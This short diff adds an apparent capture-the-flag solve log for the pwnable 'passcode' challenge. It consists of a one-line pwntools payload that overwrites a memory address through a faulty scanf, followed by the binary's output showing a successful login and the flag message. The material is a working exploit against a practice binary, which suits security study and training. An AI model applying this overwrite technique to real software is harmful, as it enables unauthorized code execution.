@@ -1,0 +1,9 @@
+python -c 'from pwn import *; print "A" *96 + p32(0x804a018) +"\n134514135"' > /tmp/bbbb/b
+passcode@pwnable:~$ ./passcode < /tmp/bbbb/b
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
+enter passcode1 : enter passcode2 : checking...
+Login Failed!
+Login OK!
+Sorry mom.. I got confused about scanf usage :(
+Now I can safely trust you that you have credential :)
